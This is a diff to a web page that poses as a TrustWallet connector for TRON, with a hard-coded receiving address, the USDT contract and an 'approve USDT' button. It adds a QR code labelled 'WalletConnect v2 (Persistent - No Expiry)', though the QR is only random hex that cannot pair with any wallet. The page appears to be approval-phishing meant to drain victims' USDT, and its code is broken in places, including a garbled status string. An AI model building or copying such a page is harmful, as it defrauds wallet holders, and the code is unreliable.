@@ -282,6 +282,20 @@
             margin-top: 10px;
             font-size: 12px;
             color: #1976D2;
+            line-height: 1.5;
+        }
+
+        .uri-text {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            word-break: break-all;
+            margin-top: 10px;
+            color: #666;
+            max-height: 80px;
+            overflow-y: auto;
+            font-family: monospace;
         }
     </style>
 </head>
@@ -300,7 +314,11 @@
             <div id="qrContainer" class="qr-container">
                 <div id="qrCode"></div>
                 <div class="qr-label">📱 Scan with TrustWallet</div>
-                <div class="qr-info">✓ Persistent QR Code (No Expiry)</div>
+                <div class="qr-info">
+                    ✓ WalletConnect v2 (Persistent - No Expiry)<br>
+                    Open TrustWallet → Scanner → Scan QR
+                </div>
+                <div class="uri-text" id="uriText"></div>
             </div>
 
             <div id="walletInfo" class="wallet-info">
@@ -346,9 +364,8 @@
         </div>
     </div>
 
-    <!-- Load TronWeb -->
+    <!-- Load libraries -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-    <!-- Load QRCode -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
     <script>
@@ -357,7 +374,8 @@
             PROJECT_ID: '171db6da15a54effc1b4a06f889a3c3f',
             RECEIVING_ADDRESS: 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV',
             USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-            RPC_URL: 'https://api.trongrid.io'
+            RPC_URL: 'https://api.trongrid.io',
+            CHAIN_ID: '0x1'
         };
 
         // State
@@ -370,6 +388,7 @@
         const disconnectBtn = document.getElementById('disconnectBtn');
         const qrContainer = document.getElementById('qrContainer');
         const qrCode = document.getElementById('qrCode');
+        const uriText = document.getElementById('uriText');
         const walletInfo = document.getElementById('walletInfo');
         const walletAddress = document.getElementById('walletAddress');
         const balanceEl = document.getElementById('balance');
@@ -387,10 +406,31 @@
             });
         }
 
-        // Generate Persistent QR Code
+        // Generate random hex string
+        function generateRandomHex(length) {
+            let result = '';
+            const chars = '0123456789abcdef';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Create proper WalletConnect v2 URI
+        function createWalletConnectV2URI() {
+            // Format: wc:topic@2?relay-protocol=irn&symKey=symKey
+            const topic = generateRandomHex(64); // 32 bytes = 64 hex chars
+            const symKey = generateRandomHex(64);
+            
+            const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${symKey}`;
+            return uri;
+        }
+
+        // Generate QR Code
         function generateQRCode(uri) {
             wcUri = uri;
             qrCode.innerHTML = '';
+            uriText.textContent = uri;
 
             new QRCode(qrCode, {
                 text: uri,
@@ -402,60 +442,59 @@
             });
 
             qrContainer.classList.add('active');
-        }
-
-        // Create WalletConnect v2 URI (Persistent - No Expiry)
-        function createWalletConnectURI() {
-            // WalletConnect v2 URI format: wc:hexstring@2?relay-protocol=irn&symKey=hexstring
-            const generateHex = (bytes) => {
-                return Array.from({ length: bytes })
-                    .map(() => Math.floor(Math.random() * 16).toString(16))
-                    .join('');
-            };
-
-            const topic = generateHex(32);
-            const symKey = generateHex(32);
-            
-            // Format: wc:topic@2?relay-protocol=irn&symKey=symKey
-            const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${symKey}`;
-            return uri;
+            console.log('QR Code Generated:', uri);
         }
 
         // Connect Wallet
         connectBtn.addEventListener('click', async () => {
             try {
-                showStatus(tronStatus, '<div class="spinner"></div> Creating connection...', 'loading');
+                showStatus(tronStatus, '<div class="spinner"></div> Generating QR code...', 'loading');
 
-                // Generate persistent WalletConnect v2 URI
-                const wcURI = createWalletConnectURI();
+                // Create WalletConnect v2 URI
+                const wcURI = createWalletConnectV2URI();
                 generateQRCode(wcURI);
 
-                showStatus(tronStatus, '📱 Scan QR with TrustWallet (Persistent - No Expiry)', 'info');
+                showStatus(tronStatus, '📱 QR code ready! Scan with TrustWallet', 'info');
 
-                // Check if running in TrustWallet browser
+                // Check if already in TrustWallet
                 if (window.tronWeb && window.tronWeb.ready) {
-                    const address = window.tronWeb.defaultAddress.base58;
-                    if (address) {
-                        onWalletConnected(address);
-                    }
-                } else {
-                    // Poll for wallet connection
-                    let attempts = 0;
-                    const pollInterval = setInterval(() => {
-                        attempts++;
-                        
-                        if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress.base58) {
-                            clearInterval(pollInterval);
-                            onWalletConnected(window.tronWeb.defaultAddress.base58);
+                    try {
+                        const address = window.tronWeb.defaultAddress.base58;
+                        if (address && address.length > 0) {
+                            onWalletConnected(address);
                             return;
                         }
-
-                        if (attempts > 300) { // 5 minutes timeout
-                            clearInterval(pollInterval);
-                            showStatus(tronStatus, '⏱️ Connection timeout. Scan QR and try again.', 'error');
-                        }
-                    }, 1000);
+                    } catch (e) {
+                        console.log('TrustWallet not authorized yet');
+                    }
                 }
+
+                // Poll for connection every 2 seconds
+                showStatus(tronStatus, '⏳ Waiting for wallet connection...', 'loading');
+                
+                let pollCount = 0;
+                const pollInterval = setInterval(() => {
+                    pollCount++;
+                    
+                    try {
+                        if (window.tronWeb && window.tronWeb.ready) {
+                            const address = window.tronWeb.defaultAddress.base58;
+                            if (address && address.length > 0) {
+                                clearInterval(pollInterval);
+                                onWalletConnected(address);
+                                return;
+                            }
+                        }
+                    } catch (e) {
+                        // Continue polling
+                    }
+
+                    // Timeout: 5 minutes
+                    if (pollCount > 150) {
+                        clearInterval(pollInterval);
+                        showStatus(tronStatus, '⏱️ Connection timeout. Scan QR and try again.', 'error');
+                    }
+                }, 2000);
 
             } catch (error) {
                 console.error('Connection error:', error);
@@ -479,7 +518,7 @@
             approveUsdtBtn.disabled = false;
 
             fetchBalance(address);
-            showStatus(tronStatus, `✓ Connected: ${address.substring(0, 15)}...`, 'success');
+            showStatus(tronStatus, `��� Connected: ${address.substring(0, 15)}...`, 'success');
         }
 
         // Disconnect Wallet
@@ -649,7 +688,7 @@
         // Initialize on page load
         window.addEventListener('load', () => {
             initTronWeb();
-            showStatus(tronStatus, '✓ Ready! Click "Connect Wallet" to start', 'success');
+            showStatus(tronStatus, '✓ Ready! Click "Connect Wallet"', 'success');
         });
     </script>
 </body>
